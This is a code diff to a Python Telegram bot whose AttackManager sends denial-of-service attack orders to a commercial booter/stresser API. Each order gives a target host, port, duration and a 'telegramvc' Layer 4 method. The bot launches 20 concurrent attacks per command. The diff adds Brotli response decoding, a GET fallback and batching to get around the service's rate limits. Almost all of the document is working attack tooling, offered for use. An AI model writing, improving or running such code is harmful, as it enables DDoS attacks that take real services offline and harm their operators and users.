@@ -1,4 +1,4 @@
-# app.py - Correct API Format for Telegram VC
+# app.py - Fixed with Brotli support
 import os
 import logging
 import asyncio
@@ -6,7 +6,7 @@ import threading
 import aiohttp
 import time
 import json
-import re
+import brotli
 from datetime import datetime
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -135,48 +135,68 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== CORRECT API CALL =====
+# ===== DECODE BROTLI RESPONSE =====
+def decode_brotli_response(response_text):
+    """Decode Brotli compressed response"""
+    try:
+        # Try to decode as Brotli
+        decoded = brotli.decompress(response_text)
+        return decoded.decode('utf-8')
+    except:
+        # If not Brotli, return as is
+        return response_text
+
+# ===== CORRECT API CALL WITH BROTLI SUPPORT =====
 async def send_attack_correct(target, port, duration, attack_num):
     """
-    Correct API format that actually sends the attack
-    Using POST with correct method name
+    Correct API format with Brotli support
     """
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Correct parameters that work with the API
-    # Method MUST be "telegramvc" for Telegram Voice Call attacks
+    # Correct parameters
     params = {
         "key": API_KEY,
         "host": target,
         "port": port,
         "time": duration,
-        "method": "telegramvc",  # This is the correct method name
+        "method": "telegramvc",
         "network": "normal",
         "concurrent": "1",
         "servers": "LAYER 4 #1"
     }
     
-    # Headers to mimic browser
+    # Headers to mimic browser - remove brotli encoding to avoid issues
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5",
-        "Accept-Encoding": "gzip, deflate, br",
+        "Accept-Encoding": "gzip, deflate",  # Remove brotli to avoid issues
         "Connection": "keep-alive",
+        "Content-Type": "application/x-www-form-urlencoded",
         "Upgrade-Insecure-Requests": "1"
     }
     
     try:
         timeout = aiohttp.ClientTimeout(total=duration + 20)
         
-        # Try POST first (most likely)
+        # Try POST with form data (this is what website uses)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             start_time = time.time()
             
-            # Try POST with form data
             async with session.post(url, data=params, headers=headers) as response:
                 elapsed = time.time() - start_time
-                result_text = await response.text()
+                
+                # Read raw response
+                raw_response = await response.read()
+                
+                # Try to decode if compressed
+                try:
+                    result_text = raw_response.decode('utf-8')
+                except:
+                    try:
+                        result_text = decode_brotli_response(raw_response)
+                    except:
+                        result_text = raw_response.decode('utf-8', errors='ignore')
                 
                 # Check if attack was successful
                 is_success = (
@@ -198,41 +218,50 @@ async def send_attack_correct(target, port, duration, attack_num):
                         "response": result_text[:300],
                         "full_response": result_text
                     }
-        
-        # If POST failed, try GET
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            start_time = time.time()
-            async with session.get(url, params=params, headers=headers) as response:
-                elapsed = time.time() - start_time
-                result_text = await response.text()
-                
-                is_success = (
-                    "SUCCESS" in result_text or 
-                    "sent" in result_text.lower() or
-                    "attack" in result_text.lower() or
-                    "Host:" in result_text or
-                    "Concurrent:" in result_text
-                )
-                
-                if is_success:
-                    logger.info(f"✅ Attack {attack_num} SUCCESS via GET")
-                    return {
-                        "success": True,
-                        "attack_num": attack_num,
-                        "method": "GET",
-                        "status": response.status,
-                        "elapsed": f"{elapsed:.2f}s",
-                        "response": result_text[:300],
-                        "full_response": result_text
-                    }
-        
-        # If we got here, both failed
-        return {
-            "success": False,
-            "attack_num": attack_num,
-            "status": "failed",
-            "response": result_text[:200] if 'result_text' in locals() else "No response"
-        }
+                else:
+                    # Try GET as fallback
+                    async with session.get(url, params=params, headers=headers) as response2:
+                        elapsed2 = time.time() - start_time
+                        raw_response2 = await response2.read()
+                        
+                        try:
+                            result_text2 = raw_response2.decode('utf-8')
+                        except:
+                            try:
+                                result_text2 = decode_brotli_response(raw_response2)
+                            except:
+                                result_text2 = raw_response2.decode('utf-8', errors='ignore')
+                        
+                        is_success2 = (
+                            "SUCCESS" in result_text2 or 
+                            "sent" in result_text2.lower() or
+                            "attack" in result_text2.lower() or
+                            "Host:" in result_text2 or
+                            "Concurrent:" in result_text2
+                        )
+                        
+                        if is_success2:
+                            logger.info(f"✅ Attack {attack_num} SUCCESS via GET")
+                            return {
+                                "success": True,
+                                "attack_num": attack_num,
+                                "method": "GET",
+                                "status": response2.status,
+                                "elapsed": f"{elapsed2:.2f}s",
+                                "response": result_text2[:300],
+                                "full_response": result_text2
+                            }
+                        
+                        # Both failed, return the POST result
+                        return {
+                            "success": False,
+                            "attack_num": attack_num,
+                            "method": "POST",
+                            "status": response.status,
+                            "elapsed": f"{elapsed:.2f}s",
+                            "response": result_text[:200] if result_text else "No response",
+                            "full_response": result_text if result_text else "No response"
+                        }
                 
     except Exception as e:
         logger.error(f"Attack {attack_num} failed: {e}")
@@ -255,8 +284,13 @@ async def send_20_concurrent_attacks(target, port, duration):
         task = send_attack_correct(target, port, duration, i)
         tasks.append(task)
     
-    # Run all attacks concurrently
-    results = await asyncio.gather(*tasks)
+    # Run all attacks concurrently with rate limiting
+    results = []
+    for i in range(0, len(tasks), 5):  # Process in batches of 5
+        batch = tasks[i:i+5]
+        batch_results = await asyncio.gather(*batch)
+        results.extend(batch_results)
+        await asyncio.sleep(0.5)  # Small delay between batches to avoid rate limiting
     
     # Count successes
     success_count = sum(1 for r in results if r.get('success', False))
